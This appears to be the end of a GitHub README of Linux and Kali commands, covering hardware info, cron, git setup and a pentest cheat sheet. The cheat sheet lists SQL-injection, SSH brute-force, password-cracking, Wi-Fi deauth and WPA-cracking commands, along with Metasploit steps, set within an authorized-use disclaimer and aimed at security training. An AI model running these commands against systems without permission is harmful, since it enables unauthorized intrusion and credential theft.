# Hardware info
lshw                             # Full hardware list
lshw -short                      # Summary
lspci                            # PCI devices
lsusb                            # USB devices
dmidecode                        # DMI/SMBIOS info
inxi -Fxz                        # Comprehensive system info

# Kernel & Boot
uname -a                         # Kernel info
dmesg                            # Kernel ring buffer
dmesg | grep -i error            # Search error
dmesg | tail -20                 # Recent messages
cat /proc/version                # Kernel version
cat /proc/cmdline                # Boot parameters
```


## 29. Cron Jobs & Scheduling
> Schedule automated background tasks and manage routine execution intervals

```bash
# View and edit cron jobs
crontab -l                       # View current user's cron jobs
crontab -e                       # Edit current user's cron jobs
sudo crontab -l                  # View root user's cron jobs
sudo crontab -u username -l      # View a specific user's cron jobs
crontab -r                       # Remove all current user's cron jobs ⚠️

# Cron Syntax:
# * * * * * command
# │ │ │ │ │
# │ │ │ │ └── Day of week (0=Sun, 6=Sat)
# │ │ │ └──── Month (1-12)
# │ │ └────── Day of month (1-31)
# │ └──────── Hour (0-23)
# └────────── Minute (0-59)

# Examples:
# Every minute
* * * * * /path/to/script.sh

# Every hour at the 15th minute
15 * * * * /path/to/script.sh

# Every day at midnight (12:00 AM)
0 0 * * * /path/to/backup.sh

# Every Monday at 8:00 AM
0 8 * * 1 /path/to/weekly_scan.sh

# Every 5 minutes
*/5 * * * * /path/to/monitor.sh

# System-wide cron
ls /etc/cron.d/                  # View cron.d files
ls /etc/cron.daily/              # View daily scripts
ls /etc/cron.weekly/             # View weekly scripts
ls /etc/cron.monthly/            # View monthly scripts
cat /etc/crontab                 # View system crontab

# at — One-time scheduling
at 10:30                         # Run at 10:30 AM
at now + 5 minutes               # Run in 5 minutes
at -f script.sh tomorrow 9am     # Run tomorrow at 9 AM
atq                              # View job queue
atrm 2                           # Remove job 2
```


## 30. Quick Cheat Sheet
> Access rapid command lookups and essential syntax shortcuts

```text
📁 FILE & DIRECTORY
├── ls -la                             → Show all files including hidden ones
├── find / -name "..."                 → Search for files by name
├── chmod 755 file                     → Change file permissions
├── chown user:group                   → Change file ownership
└── ln -s target link                  → Symbolic link

👤 USER & PROCESS
├── whoami / id                        → Current user
├── sudo -l                            → View allowed sudo privileges
├── ps aux | grep X                    → Search for a specific process
├── kill -9 PID                        → Force kill
└── top / htop                         → Real-time monitor

🌐 NETWORK
├── ip addr                            → Show IP address
├── ping -c 4 target                   → Ping test
├── netstat -tulnp                     → Listening port
├── ss -tulnp                          → Faster alternative
└── dig / nslookup                     → DNS lookup

📦 PACKAGE
├── apt update                         → Package list update
├── apt install X                      → Install
├── apt remove X                       → Remove
├── apt search X                       → Search
└── dpkg -l | grep X                   → Check installed

🔍 NMAP
├── nmap -sS target                    → SYN scan
├── nmap -sV target                    → Version detect
├── nmap -O target                     → OS detect
├── nmap -A target                     → Aggressive
├── nmap -p- target                    → All ports
└── nmap --script=vuln                 → Vuln check

🕷️ WEB TESTING
├── gobuster dir -u URL -w wordlist    → Directory enum
├── nikto -h URL                       → Web vuln scan
├── sqlmap -u URL                      → SQL injection
├── whatweb URL                        → Tech fingerprint
└── wpscan --url URL                   → WordPress scan

🔑 PASSWORD
├── john hash.txt                      → Hash crack
├── hashcat -m 0 hash wordlist         → GPU crack
├── hydra -l user -P list ssh://target → Brute force
└── crunch 6 8 chars                   → Wordlist generate

📡 WIRELESS
├── airmon-ng start wlan0              → Monitor mode
├── airodump-ng wlan0mon               → Network scan
├── aireplay-ng -0 10 -a BSSID         → Deauth
└── aircrack-ng cap -w list            → WPA crack

🎯 METASPLOIT
├── msfconsole                         → Start
├── search X                           → Search exploit
├── use exploit/...                    → Select the exploit module
├── set RHOSTS target                  → Set target host IP
├── set LHOST our_ip                   → Set local listener IP
└── run / exploit                      → Execute the module

🔧 TEXT PROCESSING
├── grep "pattern" file                → Search
├── awk -F: '{print $1}'               → Column extract
├── sed 's/old/new/g'                  → Replace
├── cut -d: -f1                        → Field cut
├── sort | uniq -c                     → Count unique
└── command | tee file                 → Screen + file

⚡ ONE-LINERS
├── find / -perm -4000 2>/dev/null     → SUID files
├── cat /etc/passwd | cut -d: -f1      → Username list
├── ss -tulnp | grep LISTEN            → Open ports
├── grep "Failed" /var/log/auth.log    → Failed logins
└── history | grep nmap                → Past nmap commands
```


## ⚠️ Legal & Ethical Reminder
> Use these tools strictly for authorized testing and educational purposes

```text
⚠️ LEGAL & ETHICAL DISCLAIMER

✅ ONLY FOR AUTHORIZED USE:
   → Testing your own systems
   → CTF (Capture The Flag) challenges
   → Ethical hacking courses/certifications
   → Authorized penetration testing
   → Security research (with explicit permission)

❌ THESE ARE ILLEGAL — NEVER DO THEM:
   → Accessing anyone else's system without permission
   → Attacking public or corporate networks
   → Data theft or destruction
   → Unauthorized access
```


## 📚 For Further Learning
> Explore official documentation, hands-on labs and security training paths

```text
🎓 Practice Platforms:
├── TryHackMe (tryhackme.com)       → Beginner-friendly
├── HackTheBox (hackthebox.com)     → Intermediate+
├── VulnHub (vulnhub.com)           → Offline VM
├── PentesterLab                    → Web focus
└── OverTheWire (overthewire.org)   → Linux basics

📖 Resources:
├── OWASP Top 10                    → Web vulnerabilities
├── PTES (Penetration Testing Execution Standard)
├── Offensive Security (offsec.com) → OSCP certification
└── Kali Linux Docs (kali.org/docs) → Kali linux documents
```


## 🎁 Bonus: Upload Files to GitHub using Git Bash
> Learn quick Git commands to push your project files directly to GitHub

```bash
# One-time Setup (Run once on your computer)
git config --global user.name "Your Name"                       # Set your Git username
git config --global user.email "your_email@example.com"         # Set your Git email
git config --global credential.helper manager                   # Save GitHub credentials securely
# If Debious ownership error
git config --global --add safe.directory 'your_project_path'    # Give the project path (Ex.: 'D:/New folder/Github/MyProject' or * for all)
git config --global core.autocrlf true                          # If want to stop LF or CRLF warning
# Set 'main' as default to avoid typing 'git branch -M main' every time
git config --global init.defaultBranch main                     # No more 'git branch -M main'

# First Time for a New Project: Goto project folder → Open Git Bash here
git init                                                        # Initialize Git repository
git add .                                                       # Select/Stage all files
git commit -m "first commit"                                    # Create first commit
git branch -M main                                              # Rename branch to main
git remote add origin <your_github_link>                        # Paste your manual repo link here (Ex.: https://github.com/username/repo.git)
git push -u origin main                                         # Upload/Push files to GitHub

git pull origin main                                            # Sync standard updates
git pull origin main --rebase                                   # Sync completely different files

# Future Updates
git add .                                                       # Select/Stage all files or give specific file/folder name (Ex.: git add README.md or MyFolder)
git commit -m "Update project"                                  # Create update commit
git push                                                        # Upload/Push files to GitHub

# Set custom commands manually
git config --global --edit                                      # Open the global git config file in a text editor

# Set custom commands by terminal
git config --global alias.s "status"                            # Shortcut for 'git status'
# Use: git s
git config --global alias.p "push -u origin main"               # Shortcut to push code to main branch
# Use: git p
git config --global alias.ac "!git add -A && git commit -m"     # Shortcut to stage and commit all changes at once
# Use: git ac "your commit message"
git config --global alias.co "checkout"                         # Shortcut for 'git checkout' to switch branches
# Use: git co branch-name
git config --global alias.br "branch"                           # Shortcut for 'git branch' to list all local branches
# Use: git br

git config --global --get-regexp '^alias\.'                     # View all saved custom git shortcuts
git config --global --unset alias.your_alias_name               # Delete a specific custom git shortcut
```


<div align="center">

## ⭐ Show Some Love

If you find this project helpful, please consider giving it a ⭐ on [GitHub](https://github.com/iamx-ariful-islam)!  
Your support keeps this project active and growing.

</div>

---
